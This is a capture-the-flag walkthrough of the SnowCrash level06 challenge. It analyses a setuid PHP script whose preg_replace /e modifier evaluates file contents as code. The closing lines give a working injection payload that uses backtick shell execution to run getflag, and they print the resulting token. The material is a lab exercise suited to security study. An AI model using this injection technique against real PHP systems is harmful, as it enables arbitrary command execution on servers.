How to find:

    level06@SnowCrash:~$ ls -la
    total 24
    dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
    -r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
    -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
    -r-x------  1 level06 level06  675 Apr  3  2012 .profile

1 binary and 1 php script

    cat level06.php 
    #!/usr/bin/php
    <?php

    function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
    
    function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); 
    
    return $a; }
    
    $r = x($argv[1], $argv[2]); print $r;
    
    ?>

execute level06 file

    level06@SnowCrash:~$ ./level06
    PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/  level06.php on line 4


execute with argument

    level06@SnowCrash:~$ ./level06 hello
    PHP Warning:  file_get_contents(hello): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4

execute with path 

    level06@SnowCrash:~$ echo "HELLO POTXOLO" > /tmp/hello.txt
    level06@SnowCrash:~$ ./level06 /tmp/hello.txt

    HELLO POTXOLO


**Code explanation:**

The code contain 2 functions and it prints the result returned by the function x.


- Calls the function x with 2 parameters, In our case the first parameter is the file name.

- The function x calls file_get_contentswhich returns the content of the file as String

- Then calls the preg_replacewhich uses RegEx to find and replace specific string patterns.

    - Searches for the pattern ([x ...])

    - Searches for the character [ and replaces with (

    - Searches for the character ] and replaces with )

Returns the result which is then used to print to the standard output.



inside VM

    level06@SnowCrash:~$ php --version
    
    PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54) 
    Copyright (c) 1997-2012 The PHP Group
    Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies

in our machine

    (base) ➜  ~ php --version
    
    PHP 8.1.2-1ubuntu2.19 (cli) (built: Sep 30 2024 16:25:25) (NTS)
    Copyright (c) The PHP Group
    Zend Engine v4.1.2, Copyright (c) Zend Technologies
    with Zend OPcache v8.1.2-1ubuntu2.19, Copyright (c), by Zend Technologies

So... outdated php version inside VM
If we run the script in a newer php version:

    Cannot load the ionCube PHP Loader - it was built with configuration API320180731,NTS, whereas running engine is API320190902,NTS
    PHP Warning:  preg_replace(): The /e modifier is no longer supported, use preg_replace_callback instead in /home/samad/Desktop/__TMP__/SnowCrash/php_test.php on line 11


So /e modifier is no longer supported
In the official php dock they says

"When preg_replace() is called with the /e modifier, the interpreter must parse the replacement string into PHP code once for every replacement made"

In other words whatever is parsed is transformed into php code

In summary if we give something that start with [x  and end with ] and whetever inside will be treated as php code

We can use the execution operators( ` ) to execute shell commands.

    level06@SnowCrash:~$ echo '[x ${`getflag`} ]' > /tmp/getflag06
    level06@SnowCrash:~$ ./level06 /tmp/getflag06
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    in /home/user/level06/level06.php(4) : regexp code on line 1
    